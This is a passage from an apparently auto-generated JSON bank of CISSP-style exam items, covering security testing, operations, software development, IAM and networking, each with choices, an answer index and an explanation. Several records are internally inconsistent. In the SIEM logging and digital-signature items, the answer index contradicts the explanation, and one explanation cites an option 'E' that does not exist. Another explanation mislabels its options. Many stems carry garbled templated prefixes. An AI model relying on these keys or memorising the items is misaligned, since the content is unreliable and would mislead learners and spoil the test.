        "Update the Organization policies to make sure these issues are handled organization-wide",
        "Review the existing policies to find the gap"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. Fixing issues is not the responsibility of Senior Management; their first step is to review the Audit results and recommendations. This may involve reviewing the existing policies, standards, and procedures to identify the gaps and decide on the steps needed to handle the situation. Based on the recommendations, Risk Analysis needs to be done and the results need to be reviewed. In case of any change, Change Management procedures must be followed."
    },
    {
      "id": "d6-q96",
      "domain": "6. Security Assessment and Testing",
      "stem": "After a control-gap review, a cloud-based SaaS service provider is working on a new SaaS application. At what stage must they involve the Penetration Testing Team?",
      "choices": [
        "During the Design Phase",
        "During the Testing Phase",
        "After Prod Release",
        "Before Prod release"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. In general, a pen test should be done right before a system is put into production, once the system is no longer in a state of constant change. A pen test is not a one-time task. Networks and computer systems are dynamic, meaning that they do not stay the same for very long."
    },
    {
      "id": "d6-q97",
      "domain": "6. Security Assessment and Testing",
      "stem": "Your organization performs regular vulnerability assessments to define, identify, classify, and prioritize vulnerabilities. However, even after regularly getting no warning from the vulnerability assessment tools, they have recently been breached. What could be the reason behind this?",
      "choices": [
        "Vulnerability Scanners only detect known vulnerabilities",
        "The systems are not patched",
        "Vulnerability Assessments do not detect Phishing attacks",
        "Vulnerability Assessments do not define the risks associated with the vulnerabilities"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Vulnerability scanning helps businesses identify known vulnerabilities and security misconfigurations. Generally, the scanners have a database of known vulnerabilities which it tries to identify in the system. This gives room to unknown vulnerabilities or Zero-day vulnerabilities."
    },
    {
      "id": "d6-q98",
      "domain": "6. Security Assessment and Testing",
      "stem": "The sales department is adding a new API layer to their existing application Interface. This will allow other teams to fetch sales app data programmatically, within the enterprise. What option testing types is least likely to be performed in this scenario?",
      "choices": [
        "Interface Testing",
        "Regression Testing",
        "Alpha Testing",
        "Beta Testing"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Beta Testing is conducted at one or more customer sites by end-users of the software. This version is released for a limited number of users for testing in a real-time environment. In the described scenario, since the product is being used internally, Beta Testing is least likely to be done of the available options. Alpha Testing (3) is a type of validation testing. It is a type of acceptance testing which is done before the product is released to customers. It is typically done by QA people. Interface Testing (1) is defined as a software testing type that verifies whether the communication between two different software systems is done correctly. Since in the above scenario, a new interface is being developed, it is highly probable that Interface testing will be performed. Regression testing (2) is a software testing practice that ensures an application still functions as expected after any code changes, updates, or improvements. Regression testing is responsible for the overall stability and functionality of existing features. Since, in the above scenario, a new feature is being added, regression testing must be performed."
    },
    {
      "id": "d6-q99",
      "domain": "6. Security Assessment and Testing",
      "stem": "In a recent internal assessment, a recent Security Audit suggested incorporating a SIEM system to consolidate the logs and monitor events. What option events should be captured in the logs? (Select all options that apply)?",
      "choices": [
        "System Access events",
        "Shutdown or system restart events",
        "Modification of Data",
        "Application Failures"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1, 2, 3, and 4. As per the NIST SP 800-92 the following events should be logged: • Operating System (OS) Eventsstart-up up and shut down of the system • start up and down of a service • network connection changes or failures • changes to, or attempts to change, system security settings and controls • OS Audit Records • log on attempts (successful or unsuccessful) • the function(s) performed after logged on (e.g., reading or updating critical file, software installation) • account changes (e.g., account creation and deletion, account privilege assignment) • successful/failed use of privileged accounts • Application Account Information • successful and failed application authentication attempts • application account changes (e.g., account creation and deletion, account privilege assignment) • use of application privileges • Application operations • application start-up and shutdown • application failures • major application configuration changes • application transactions Amongst the options above, Private File Creation and Confidential Email Attachment download will generally not be logged in the SIEM systems as this is the operation that takes place locally on the user endpoint machine. There are other controls to handle email attachment malware detection etc. Therefore, E is incorrect."
    },
    {
      "id": "d6-q100",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a recent attack, attackers exploited your corporation's newly launched application. The attackers exploited the buffer overflow vulnerability in the new system. What option testing methodologies could have been missed?",
      "choices": [
        "User Acceptance Testing",
        "Use Case Testing",
        "System Integration Testing",
        "Misuse Case Testing"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. The Buffer Overflow attack is generally caused when the testing strategies do not include input validation or misuse case testing. Misuse case testing is a process used by software testers to evaluate the vulnerability of their software to known risks. Testers first enumerate the known misuse cases and then attempt to exploit those use cases with manual and/or automated attack techniques."
    },
    {
      "id": "d6-q101",
      "domain": "6. Security Assessment and Testing",
      "stem": "An enterprise's Security Policy mandates Periodic Recertification of Privileged Accounts, Service Accounts, and Temporary Accounts by the respective application owners as is required by Industry Regulations. What option systems are generally used for Recertifications?",
      "choices": [
        "Identity Management System",
        "Privileged Access Management System",
        "Identity Governance System",
        "Security Information and Event Management System"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Identity governance (IG) is a subcategory of identity and access management (IAM) that emerged from the needs of organizations to comply with regulatory requirements such as the Sarbanes-Oxley Act (SOX) and the Health Insurance Portability and Accountability Act (HIPAA). Identity governance provides organizations with better visibility of identities and access privileges and better controls to detect and prevent inappropriate access. Identity governance solutions are designed to link people, applications, data, and devices to allow customers to determine who has access to what, what kind of risk that represents, and to take action in situations where policy violations are identified. Identity Management System (1) is the next choice. Often, Identity Governance systems are a subset of Identity Management Systems, but this is not always the case. PAM systems (2) manage Privileged Accounts and often provide the capabilities of Privilege Account Management, Password Management, etc. However, they are generally not used for Recertification or UAR, nor do they manage Temporary Accounts. Answer option 4, Security information and event management (SIEM), refers to a category of software products and services that combine security information management (SIM) and security event management (SEM). They provide real-time analysis of security alerts generated by applications and networked hardware. Vendors sell SIEM as software, as appliances, or as managed services, and these products are also used to log security data and generate reports for compliance purposes."
    },
    {
      "id": "d6-q102",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a quarterly audit, based on the enterprise's BCP, the administrator team backs up the critical Infrastructure every day as per the Security Policy. What is the best way to validate the backups?",
      "choices": [
        "Validate the Audit logs of the backup processes",
        "Make sure the backup hardware and storage infrastructure is protected",
        "Compare the data between the actual system and backups",
        "Restore systems from the backups"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. The best way to validate the backups is by occasionally restoring and testing the backups to ensure that the data is intact and has maintained its integrity."
    },
    {
      "id": "d6-q103",
      "domain": "6. Security Assessment and Testing",
      "stem": "In a recent internal assessment, what option audits is considered to be the most effective way to evaluate security controls in an enterprise?",
      "choices": [
        "Internal Audits",
        "External Audits",
        "Third-Party Audits",
        "Security Control Assessments"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Third-Party Audits are generally considered to be the most effective way to evaluate Security Controls within an organization. Third-party audits are independent, impartial, audits with the objective of assessing the level of conformity of a management system to certain audit criteria. It is independent of the customer-supplier relationship and is free of any conflict of interest. The independence of the audit organization is a key component of a third-party audit."
    },
    {
      "id": "d7-q95",
      "domain": "7. Security Operations",
      "stem": "Your enterprise's Security Administration Team recently installed an Intrusion Detection System (IDS) which will help the organization strengthen its attack detection capability. However, during its operation, the Administration Team encountered many false positives. What option techniques works best to reduce the number of false positives?",
      "choices": [
        "Place the IDS after the DMZ that will warrant valid traffic",
        "Establish IDS policies to handle known false positives",
        "Keep the IDS updated with the most recent security patches",
        "Place the IDS behind the firewall"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. An improperly tuned IDS will generate an overwhelming number of false positives. Establishing a policy that removes known False Positives will save time in future investigations and prevent unwarranted escalations. An IDS is generally placed after the firewall. Placing the IDS in this location allows it to do its job on all traffic that gets through the edge firewall and provides an extra layer of protection for the DMZ. The DMZ is the most vulnerable part of your network since it contains your public servers such as Internet-accessible web servers, DNS servers, and front-end mail servers."
    },
    {
      "id": "d7-q96",
      "domain": "7. Security Operations",
      "stem": "As part of a risk reduction initiative, security Configuration Management Process is comprised of the following steps: 1. Controlling Configuration Changes 2. Planning 3. Identifying and Implementing Configurations 4. Monitoring What option options specifies the correct sequence of the Security Configuration Management?",
      "choices": [
        "1 -> 2 -> 3 -> 4",
        "2 -> 3 -> 1 -> 4",
        "2 -> 1-> 3 -> 4",
        "3 -> 2-> 1 -> 4"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. As per the NIST SP 800-128, security-focused configuration management of systems involves a set of activities that can be organized into four major phases: Planning -> Identifying and Implementing Configurations -> Controlling Configuration Changes -> Monitoring"
    },
    {
      "id": "d7-q97",
      "domain": "7. Security Operations",
      "stem": "During an Audit of a financial enterprise, it was found that many Service Accounts used were admin accounts with full admin capabilities of the underlying systems. What option security concepts is violated in this case?",
      "choices": [
        "Separation of Duties",
        "Privilege Account Management",
        "Need to Know",
        "Least Privilege"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. The principle of least privilege is the idea that any user, program, or process should have only the bare minimum privileges necessary to perform its function. For example, a user account created for pulling records from a database doesn't need admin rights, while a programmer whose main function is updating lines of legacy code doesn't need access to financial records. This principle states that a user shall only have access to the information that their job function requires, regardless of their security clearance level or other approvals. In other words: a user needs permissions AND a Need-to-know, and that Need-to-know is strictly bound to a real requirement for the User to fulfill their current role."
    },
    {
      "id": "d7-q98",
      "domain": "7. Security Operations",
      "stem": "Amina, a trainee, found a shining USB pen drive in the common public area in front of the office compound. Intrigued, she connected the pen drive to her office laptop which led to the automatic installation of malware. What option approaches would be the best protection against this scenario?",
      "choices": [
        "Antimalware Software",
        "Employee security awareness training",
        "Blocking USB devices",
        "Scanning employees every time they enter the building"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. In the described scenario, employee security awareness training is the most effective way to protect against this type of cyber threat by teaching employees not to insert untrusted removable media into their computers. If for some reason an employee needs to plug in the flash drive, then the organization should have a process to handle such a case (i.e., testing the USB drive in a sandbox environment for various malicious activities). Installation of Antimalware software is critical to handle the situation once the system gets affected; however, the first line of defense is employee awareness training followed by other protection controls (defense in depth)."
    },
    {
      "id": "d7-q99",
      "domain": "7. Security Operations",
      "stem": "After a control-gap review, it has been discovered that the Chief Information Officer's (CIO) corporate account has been compromised recently with a sophisticated Whaling attack. The attackers compromised the data and encrypted the contents of the CIO's laptop which contains many confidential files. In this scenario, what is the next step that the Incident Management Team will perform?",
      "choices": [
        "Preparation",
        "Detection and Analysis",
        "Containment, Eradication, and Recovery",
        "Post-Event Activity"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. The NIST incident response lifecycle breaks incident response down into four main phases: Preparation; Detection and Analysis; Containment, Eradication, and Recovery; and Post-Event Activity. Given the described scenario, the next step for the Incident Management Team would be to analyze the impact of the attack. Analysis is right after detection. Even though it is found that the CIO's laptop contents are encrypted, it is crucial to analyze whether the attack is limited just to the CIO's laptop, or if it has impacted other systems as well."
    },
    {
      "id": "d7-q100",
      "domain": "7. Security Operations",
      "stem": "Patch Tuesday is the term used to refer to when Microsoft, Adobe, Oracle, and others regularly release software patches for their software products. What option options is the least likely reason for installing patches?",
      "choices": [
        "To fix Configuration issues",
        "Security",
        "Feature Improvement",
        "Compliance"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Fixing configuration is not the reason to install a patch. Patch management is important for the following key reasons: Security: Patch management fixes vulnerabilities in your software and applications that are susceptible to cyber-attacks, helping your organization to reduce its security risk. System uptime: Patch management ensures your software and applications are kept up-to-date and that they run smoothly, supporting system uptime. Compliance: With the continued rise in cyber-attacks, organizations are often required by regulatory bodies to maintain a certain level of compliance. Patch management is a necessary piece of adhering to compliance standards. Feature improvements: Patch management can go beyond software bug fixes to also include feature/functionality updates. Patches can be critical to ensuring that you have the latest and greatest that a product has to offer."
    },
    {
      "id": "d7-q101",
      "domain": "7. Security Operations",
      "stem": "As part of a risk reduction initiative, aiko recently completed the ITIL Certification which advocates implementing the Change Management Process in the Enterprise. Arrange the following steps in the correct sequence of the Change Management Process. A. Documenting the changes. B. Testing the changes. C. Creating requests for changes. D. Reviewing requests for changes. E. Approve/Reject changes. F. Schedule and Implement changes. Select the correct sequence of steps from the given options:?",
      "choices": [
        "C -> D -> E -> B -> F -> A",
        "C -> D -> B -> E -> F -> A",
        "C -> D -> E -> F -> B -> A",
        "C -> E -> D -> B -> F -> A"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. ITIL change management is a process designed to understand and minimize risks while making IT changes. Businesses have two main expectations of the services provided by IT: the services should be stable, reliable, and predictable, and the services should be able to change rapidly to meet evolving business requirements. 1. Creating requests for changes (RFC) 2. Reviewing requests for changes. 3. Approving/Rejecting changes. 4. Testing changes. 5. Scheduling and Implementing changes. 6. Documenting changes."
    },
    {
      "id": "d8-q66",
      "domain": "8. Software Development Security",
      "stem": "Your organization has recently implemented the Software Assurance Maturity Model (SAMM) which provides a way to analyze and improve the secure development lifecycle. What option features is not provided by SAMM?",
      "choices": [
        "Audit an organization's existing software development tools",
        "Build a balanced software security assurance program in well-defined iterations",
        "Demonstrate concrete improvements to a security assurance program",
        "Define and measure security-related activities throughout an organization"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. The Software Assurance Maturity Model (SAMM) is an open framework to help organizations formulate and implement a software security strategy tailored to specific risks the organization is facing. SAMM helps you: * Evaluate an organization's existing software security practices * Build a balanced software security assurance program in well-defined iterations (2) * Demonstrate concrete improvements to a security assurance program (3) * Define and measure security-related activities throughout an organization (4)"
    },
    {
      "id": "d8-q67",
      "domain": "8. Software Development Security",
      "stem": "Alpine Corp is a Business Software Solution development organization that follows the Agile model for implementing custom software solutions. What option principles is least aligned to the Agile Model?",
      "choices": [
        "Business people and developers must work together daily throughout the project.",
        "Working software is the primary measure of progress.",
        "The art of minimizing the amount of work not done is essential.",
        "At regular intervals, the team reflects on how to become more effective, then tunes and adjusts its behavior accordingly."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Out of the given options, the principle of minimizing the amount of work not done is least aligned to the Agile model. On the contrary, in the Agile model the art of maximizing the work not done is essential. The following principles are based on the Agile Manifesto: • Our highest priority is to satisfy the customer through early and continuous delivery of valuable software. • Welcome changing requirements, even late in development. Agile processes harness change for the customer's competitive advantage. • Deliver working software frequently, from a couple of weeks to a couple of months, with a preference for the shorter timescale. • Business people and developers must work together daily throughout the project. • Build projects around motivated individuals. Give them the environment and support they need, and trust them to get the job done. • The most efficient and effective method of conveying information to and within a development team is face-to-face conversation. • Working software is the primary measure of progress. • Agile processes promote sustainable development. The sponsors, developers, and users should be able to maintain a constant pace indefinitely. • Continuous attention to technical excellence and good design enhances agility. • Simplicity – the art of maximizing the amount of work not done – is essential. • The best architectures, requirements, and designs emerge from self-organizing teams. • At regular intervals, the team reflects on how to become more effective, then tunes and adjusts its behavior accordingly."
    },
    {
      "id": "d8-q68",
      "domain": "8. Software Development Security",
      "stem": "After a control-gap review, aBC Inc is struggling with a source code management issue. As the development team grows, code management is becoming a big issue. What option source code management practices is least likely to be considered a best practice?",
      "choices": [
        "Ensure you're working from the latest version",
        "Review changes before committing",
        "Make detailed notes",
        "Don't Commit often"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Source code management (SCM) or Version Control is used to track modifications to a source code repository. SCM tracks a running history of changes to a code base and helps resolve conflicts when merging updates from multiple contributors. The best practices of SCM are as follows: • Commit often • Ensure you're working from the latest version • Review changes before committing • Make detailed notes • Agree on a Workflow"
    },
    {
      "id": "d8-q69",
      "domain": "8. Software Development Security",
      "stem": "The security team wants to enhance Security Response capabilities such that they could automatically respond to many commonly occurring incidents. What option options will they most likely consider?",
      "choices": [
        "SIEM",
        "UEBA",
        "SOAR",
        "EDR"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. SOAR (Security Orchestration, Automation, and Response) refers to a collection of software solutions and tools that allow organizations to streamline security operations. It enables organizations to collect inputs monitored by the security operations team. For example, alerts from the SIEM system and other security technologies (where incident analysis and triage can be performed by leveraging a combination of human and machine power) help define, prioritize, and drive standardized incident response activities."
    },
    {
      "id": "d8-q70",
      "domain": "8. Software Development Security",
      "stem": "During a quarterly audit, your organization uses the COTS Identity Management Software. Recently the Vendor Support Team contacted your security team informing them that there is a security patch released by the vendor. They suggested you implement it. What is the next step your security team should perform?",
      "choices": [
        "Install the patch on your PROD env as this is a security issue",
        "Review the patch on your non-PROD env and do regression testing",
        "Review the patch changes and add them to the backlog to install them in the next available release",
        "Since this is a security patch, harden your enterprise ingress/egress points"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. In this situation, review the patch on your non-prod environment and do regression testing to validate if the existing features and functions of your IAM system work as intended. Once that is done, the Security Patch should be installed on the PPTE or other environments, and validation must be completed. Once everything is reviewed based on the change control process, the Security Patch must be applied to the PROD environment."
    },
    {
      "id": "d8-q71",
      "domain": "8. Software Development Security",
      "stem": "According to the OWASP Top 10 Web Application Vulnerabilities Report, Broken Access Control issues were found in 94% of applications. What option controls is least effective against Broken Access Control?",
      "choices": [
        "Except for public resources, deny by default.",
        "Implement access control mechanisms once and re-use them throughout the application",
        "Log access control failures and alert admins when appropriate (e.g., repeated failures).",
        "Model access controls should be based on the user's right to perform operations like create, read, update, or delete any record."
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Per the OWASP Top 10 Report, to handle Broken Access Control, we need to model access controls that should enforce record ownership rather than accepting that the user can create, read, update, or delete any record. Other Controls include: • Except for public resources, deny by default. • Implement access control mechanisms once and re-use them throughout the application, including minimizing Cross-Origin Resource Sharing (CORS) usage. • Unique application business limit requirements should be enforced by domain models. • Disable web server directory listing and ensure file metadata (e.g.,. git) and backup files are not present within web roots. • Log access control failures, and alert admins when appropriate (e.g., repeated failures). • Rate limit API and controller access to minimize the harm from automated attack tooling. • Stateful session identifiers should be invalidated on the server after logout."
    },
    {
      "id": "d8-q72",
      "domain": "8. Software Development Security",
      "stem": "After a control-gap review, arif recently found that his email address got updated on one of the social networking websites. This led to account compromise. Upon checking his browsing history, he found the URL as https://letsconnect.com/email/change?email=thatsthepriceyoupaidforfreemusic@teamail.com. What is the most likely cause for this?",
      "choices": [
        "CSRF",
        "XSS",
        "SQL Injection",
        "Insecure Direct Object References"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same-origin policy, which is designed to prevent different websites from interfering with each other."
    },
    {
      "id": "d3-q96",
      "domain": "3. Security Architecture and Engineering",
      "stem": "After a control-gap review, a manufacturing organization is planning to migrate some critical infrastructure to a cloud environment. As a security consultant, you have been tasked with finding a cost-effective solution that will help the organization offload hardware and patching requirements but keep control over its applications and data. What solution would you propose?",
      "choices": [
        "Private cloud - PaaS",
        "Public cloud - SaaS",
        "Community cloud - IaaS",
        "Public cloud - PaaS"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Cloud service providers (CSP) mainly offer 4 types of cloud deployment models: a) Private cloud: Underlying infrastructure and resources are dedicated to a single organization. This model offers better performance and security but at a high cost. b) Community cloud: A similar group of organizations share the infrastructure and resources provided by the CSP. It is costlier than the public cloud but cheaper than a private cloud. c) Public cloud: Multiple organizations share the same underlying infrastructure and resources hosted by the CSP. It is a cost-effective model compared to private and community models. d) Hybrid cloud: A combination of two or more of the models described above. Each deployment model consists of different service models that define responsibilities between the vendor and the cloud provider a) Software As a Service (SaaS) – The CSP bears all the responsibilities of the infrastructure. Providing the application, maintaining the software with patches and hardware replacements. b) Infrastructure As a Service (IaaS) - The customer takes the responsibility of maintaining the application, securing the data, and patching the OS while the CSP retains the responsibility of providing Infrastructure services like networking, server infrastructure, and virtualization. c) Platform As a Service (PaaS) – This service model gives the organization complete control over the application and data while assigning the patching and hardware responsibility to the cloud vendor."
    },
    {
      "id": "d3-q97",
      "domain": "3. Security Architecture and Engineering",
      "stem": "After a control-gap review, a global payment processor wants to send a secure message to a member of the board of directors (BOD). They create a digest of the message they want to send by running it through the hashing algorithm. They then encrypt the message digest with their private key and send the message, along with the encrypted digest, to the relevant member of the BOD. Which security principles/concepts are NOT upheld by this process? (Select TWO)?",
      "choices": [
        "Confidentiality",
        "Integrity",
        "Non-repudiation",
        "Availability"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 3 and 4. Neither confidentiality nor availability are upheld. The scenario described in the question implies the CEO used digital signatures to send a secure message to the board member. When a member of the BOD receives the plaintext message along with the encrypted message digest, they will decrypt the digest using the CEO's public key. This verifies that the message has come from the CEO (Authentication) and since it was encrypted with their private key, they cannot deny having sent that message later (non-repudiation). After decrypting the message digest, the member of the BOD will run the plaintext message through the same hashing algorithm and will compare the output hash value with the decrypted hash. If both the values match then the message was unaltered in transit (Integrity). Since the original message was sent in plain text, an attacker could easily read the message in transit. Therefore, it does not provide confidentiality. Digital signatures are not used to maintain system uptime or high availability, so it does not uphold availability either."
    },
    {
      "id": "d2-q77",
      "domain": "2. Asset Security",
      "stem": "During a security governance meeting, an organization decides to outsource its configuration management program to a third-party vendor. They want to ensure that minimum security controls are configured on the newly imaged machines. What should the organization provide to the third-party vendor to ensure these requirements are met?",
      "choices": [
        "Policy document",
        "Best practice guidelines for system configuration",
        "Baseline configuration",
        "Procedure document"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. A baseline configuration is the minimum security that every system in the organization should have. This ensures that security controls are implemented consistently throughout the organization. More stringent controls can be implemented on top of the security baseline depending on the criticality of any given system. A policy (1) is a high-level document, approved by senior management, which does not specify security details. The best practice guidelines (2) are recommendations but are not mandatory. A procedure document (4) can be specific to a particular piece of software, or system, and it does not define the minimum security controls required."
    },
    {
      "id": "d5-q98",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A system administrator was investigating an incident and found that it occurred due to incorrect file permissions. They consulted with their manager and the manager advised them to contact the user who created that file to rectify the file permission issues. What type of access control model is the organization following?",
      "choices": [
        "Mandatory Access Control (MAC)",
        "Discretionary Access Control (DAC)",
        "Role Based Access Control (RBAC)",
        "Rule Based Access Control (RuBAC)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. In Discretionary access control (DAC), every file or object has an owner who has the exclusive rights to grant and deny permissions to the other users/subjects. Unlike MAC and RBAC, file permissions are not centrally managed. Rule-based access control (RuBAC) is similar to configuring firewall rules, where rules are defined to allow or deny subject access to the object."
    },
    {
      "id": "d8-q73",
      "domain": "8. Software Development Security",
      "stem": "In the fast-paced gaming world, an organization wants to create a game and roll it out in the market as soon as possible. Their idea and requirements are well defined, and they believe a working prototype is more important than initial planning. They hire a group of developers and game testers. The developers create an initial gaming prototype and hand it over to the testers to find any bugs in the game by playing it in real-time. Based on the feedback, developers will fix the bugs and send the amended prototype back to the testers. The organization wants this process to continue until a final prototype is ready for roll-out. Which software development model is the organization using? And what application testing technique are the testers following?",
      "choices": [
        "The company is using a spiral model and the testers are using fuzzing techniques to test the game.",
        "The company is using the JAD model and the testers are using white-box techniques to test the game.",
        "The company is using the RAD model and the testers are using DAST techniques to test the game",
        "The company is using the TAD model and the testers are using SAST techniques to test the game"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. The company is using the RAD model and the testers are using DAST techniques to test the game. The Rapid Application Development (RAD) model is a software development process that is based on prototyping. It focuses on working prototypes instead of initial planning. This type of process is used when the objective is well-defined and narrow in nature. This is an iterative process and is often used to develop mobile applications. The testers are using dynamic application testing (DAST) techniques since they are evaluating the application in real time without having access to the source code. The Joint Application Development (JAD) model refers to the process in which the users/clients work directly with the software developers to create an application. These joint working sessions give a good understanding of the project requirements, which reduces the time spent in quality assurance and testing. There is no TAD model."
    },
    {
      "id": "d6-q104",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a quarterly audit, a media streaming company hires a startup to develop a custom application that lets users monitor room temperatures and send notifications on their phones. The startup firm is responsible for developing and deploying the code. Since the IoT organization does not have any in-house expertise to support customer issues, they delegate these responsibilities to the startup firm. The manufacturing organization wants to protect its application code in case the startup organization fails to comply with its responsibilities. What type of agreement should the IoT manufacturer have in place to protect their software code?",
      "choices": [
        "Service Level Agreement",
        "Mutual Assistance Agreement",
        "Contractor Agreement",
        "Software Escrow Agreement"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. A software escrow agreement is used to protect the application code in the event that the software company goes out of business or is unable to provide technical support. The agreement obligates the software company to release the application code to a third-party provider. The provider will save the code in a secure location until the relationship between the manufacturer and the software company ends. This allows the manufacturing company to maintain control over its application. Option 1, Mutual Assistance Agreements (also referred to as reciprocal agreements) are used in disaster recovery. It's an agreement between two organizations to support each other by sharing their infrastructure resources in the event of a disaster. This is rarely used in the real world since there are major drawbacks to this approach. A service Level Agreement (SLA), B, is made between the client and the service provider, stating the terms and conditions governing the services offered. A contractor agreement (3) is similar to an SLA, but it is made between the vendor and the contractor."
    },
    {
      "id": "d4-q98",
      "domain": "4. Communication and Network Security",
      "stem": "An IT department procures a firewall that will be installed between the Internet zone and the Demilitarized Zone (DMZ). The organization only has one public IP address assigned to it. The IT manager advises the firewall administrator to configure the firewall in such a way that all the DMZ servers should have access to the internet. Which networking concept should the administrator implement to meet the manager's requirement?",
      "choices": [
        "Routing information protocol (RIP)",
        "Virtual Private Network (VPN)",
        "Network Address port translation (NAPT)",
        "One-to-One Network Address Translation (NAT)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. NPAT enables a single external IP address to host 65,536 internal IP addresses. It does so by using different port numbers for different internal IP addresses. For example: If the assigned public IP is 1.1.1.1 and we have two different internal hosts that want internet access (Computer A - 10.0.0.1 and Computer B- 10.0.0.2) then NPAT will assign a dedicated port to each computer and will save that data in the firewall's memory table until the session is closed. Computer A : 10.0.0.1: 9090 <–> 1.1.1.1 Computer B : 10.0.0.2 – 9091 <–> 1.1.1.1 Traffic coming via port 9090 will be re-directed to computer A and traffic received on port 9091 will go to computer B. One-to-One NAT (4) assigns a single public IP address to a single host. Since the organization only has 1 public IP address and multiple internal hosts, it cannot use 1-to-1 NAT. RIP (1) is a routing protocol used to route IP packets between different networks. A VPN (2) is a secure communication channel established over an untrusted network to transmit information between different entities, it does not offer a network or port translation service."
    },
    {
      "id": "d5-q99",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "During a quarterly audit, a government agency has built a facility to test their new weapons. They have implemented biometric scanning at each access door. On a sensitivity scale of 1-20, the Crossover rate (CER) is set to 10. Given the sensitivity of the operation, the military wants to avoid false positives. What is the best way to enforce physical security?",
      "choices": [
        "Decrease the CER",
        "Increase the Equal error rate (EER)",
        "Increase the sensitivity of the system",
        "Decrease the sensitivity of the system"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Crossover error rate (CER) and Equal error rate (EER) are used interchangeably, and they cannot be changed by the customer. If you want to change the CER/EER, then you will have to buy a new biometric system. As per the CER graph in the CISSP study guide, increasing the sensitivity of the system will reduce the false acceptance rate (FAR), or 'type 2 errors', but will increase the false rejection rate (FRR), type 1 errors. In the preceding scenario, the organization wants to reduce false positives. This means the FAR should be less, hence they should increase the sensitivity of the system."
    },
    {
      "id": "d8-q74",
      "domain": "8. Software Development Security",
      "stem": "As part of a risk reduction initiative, a retail bank hires a consultant to evaluate their existing software processes and help them get to the next stage of the Software Capability Maturity Model ( SW-CMM) model. Their goal is to have a basic lifecycle management process in place so that they can reuse the code in an organized fashion. In which state of SW-CMM is the software organization currently operating?",
      "choices": [
        "Repeatable",
        "Initial",
        "Defined",
        "Managed"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. The software company is currently operating in the \"Initial\" stage of the SW-CMM model. The initial stage is also called the ad-hoc stage, where the processes are not yet defined, and everyone is working individually as per requirements. The repeatable stage (1) is where the basic lifecycle management process is defined. Codes are re-used in an organized fashion to re-create the same result. The defined stage (3) is where a formalized process is documented, and software developers are expected to follow those standards and procedures. The managed stage (4) is where quantitative metrics are developed to verify if objectives are being met by the defined processes."
    },
    {
      "id": "d3-q98",
      "domain": "3. Security Architecture and Engineering",
